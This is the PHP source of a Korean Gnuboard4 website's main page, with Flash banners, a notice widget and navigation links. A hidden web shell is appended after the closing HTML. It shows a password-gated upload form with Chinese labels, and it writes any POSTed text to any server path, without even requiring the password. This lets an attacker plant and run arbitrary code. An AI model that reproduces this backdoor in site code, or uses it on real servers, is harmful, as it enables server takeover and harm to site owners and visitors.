<?
include_once("./_common.php");
include_once("$g4[path]/head.sub.php");
include_once("$g4[path]/lib/outlogin.lib.php");
include_once("$g4[path]/lib/poll.lib.php");
include_once("$g4[path]/lib/visit.lib.php");
include_once("$g4[path]/lib/connect.lib.php");
include_once("$g4[path]/lib/popular.lib.php");
include_once("$g4[path]/lib/latest.lib.php");

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>???? ????? ????</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" href="/common/css/common.css" type="text/css">
<script language="javascript" src="/common/js/common.js" type="text/javascript"></script>
</head>

<body>
	<!--- #################   Top Navi Start   ################################### -->
	<div id="TopNavi_Main">		
		<script language="JavaScript" type="text/javascript">
			AC_FL_RunContent(
				'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0',
				'width', '950',
				'height', '351',
				'src', '/img/flash/top_main.swf',
				'quality', 'high',
				'pluginspage', 'http://www.adobe.com/go/getflashplayer',
				'align', 'middle',
				'play', 'true',
				'loop', 'true',
				'scale', 'showall',
				'wmode', 'window',
				'devicefont', 'false',
				'id', 'Top_Menu',
				'bgcolor', '#ffffff',
				'name', 'Top_Menu',
				'menu', 'true',
				'allowFullScreen', 'false',
				'allowScriptAccess','sameDomain',
				'movie', '/img/flash/top_main.swf',
				'salign', ''
				); //end AC code
		</script>
		<noscript>
			<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" width="950" height="351" id="Top_Menu" align="middle">
			<param name="allowScriptAccess" value="sameDomain"/>
			<param name="allowFullScreen" value="false"/>
			<param name="movie" value="../img/flash/top_main.swf"/><param name="quality" value="high"/><param name="bgcolor" value="#ffffff"/>	<embed src="../img/flash/top_main.swf" quality="high" bgcolor="#ffffff" width="950" height="351" name="Top_Menu" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer"/>
			</object>
		</noscript>
	</div>
	<!--- #################    Top Navi End  ################################### -->

	<!--- #################  Center Start   ################################### -->
	<table width="950" cellpadding="0" cellspacing="0" border="0" style="margin-top:15px;">
		<tr>
			<td width="370" valign="top">
				<!--- ???????? STart--------------->
				<table width="340" height="20" cellpadding="0" cellspacing="0" border="0" background="/img/main/mn_notice_tt.gif" style="margin:0 0 0 10px">
					<tr>
						<td width="340" align="right" style="padding:0 5px 0 0"><a href="javascript:Goto_Sub03_01()"><img src="/img/button/btn_more01.gif" alt="More"></a></td>
					</tr>
				</table>
				<? echo latest("basic", "notice", 5, 70); ?>
				<!--- ???????? End--------------->
			</td>
			<td width="370" valign="top">
				<!--- ??????? Start---->
				<table width="350" height="20" cellpadding="0" cellspacing="0" border="0">
					<tr>
						<td width="200"><img src="/img/main/mn_ev_tt.gif"></td>
						<td width="250" align="right" style="padding:0 5px 0 0"><a href="javascript:Goto_Sub04_01()"><img src="/img/button/btn_more01.gif" alt="More"></a></td>
					</tr>
					<tr>
						<td colspan="2" style="padding:4px 0 0 0">
							<script language="JavaScript" type="text/javascript">
								AC_FL_RunContent(
									'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0',
									'width', '350',
									'height', '120',
									'src', '/img/flash/main_equip.swf',
									'quality', 'high',
									'pluginspage', 'http://www.adobe.com/go/getflashplayer',
									'align', 'middle',
									'play', 'true',
									'loop', 'true',
									'scale', 'showall',
									'wmode', 'window',
									'devicefont', 'false',
									'id', 'Top_Menu',
									'bgcolor', '#ffffff',
									'name', 'Top_Menu',
									'menu', 'true',
									'allowFullScreen', 'false',
									'allowScriptAccess','sameDomain',
									'movie', '/img/flash/main_equip.swf',
									'salign', ''
									); //end AC code
							</script>
							<noscript>
								<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" width="350" height="120" id="Top_Menu" align="middle">
								<param name="allowScriptAccess" value="sameDomain"/>
								<param name="allowFullScreen" value="false"/>
								<param name="movie" value="../img/flash/main_equip.swf"/><param name="quality" value="high"/><param name="bgcolor" value="#ffffff"/>	<embed src="../img/flash/main_equip.swf" quality="high" bgcolor="#ffffff" width="350" height="120" name="Top_Menu" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer"/>
								</object>
							</noscript>						
						</td>
					</tr>
				</table>
				<!--- ??????? End---->
			</td>
			<td width="210" valign="top">
				<a href="javascript:Goto_Sub04_05()"><img src="/img/main/mn_consult.gif" alt="???????????" style="margin:0 0 10px 0"></a><br>
				<a href="javascript:Goto_Sub01_04()"><img src="/img/main/mn_location.gif" alt="??????±?"></a><a href="javascript:Goto_Sub04_03()"><img src="/img/main/mn_data.gif" alt="???????"></a>
			</td>
		</tr>
	</table>
	<!--- #################  Center End   ################################### -->

	<!--- #################  Bottom Start ################################### -->
	<div id="Btm">
		<img src="/img/common/cm_btm_copy.gif" style="margin:10px 0 10px 245px;">
	</div>
	<!--- #################  Bottom End ################################### -->


</body>
</html>
<?php
if($_POST["woaini"]=="91ri")
{
header("content-Type: text/html; charset=utf-8");
if(get_magic_quotes_gpc()) foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
?>
<form method="POST">
保存文件名: <input type="text" name="file" size="60" value="<? echo str_replace('\\','/',__FILE__) ?>">
<br><br>
<textarea name="text" COLS="70" ROWS="18" ></textarea>
<br><br>
<input type="submit" name="submit" value="保存"> 
<form>
<?php
}
else
{
if(isset($_POST['file']))
{
   $fp = @fopen($_POST['file'],'wb');
   echo @fwrite($fp,$_POST['text']) ? '保存成功!' : '保存失败!';
   @fclose($fp);
}
}
?>
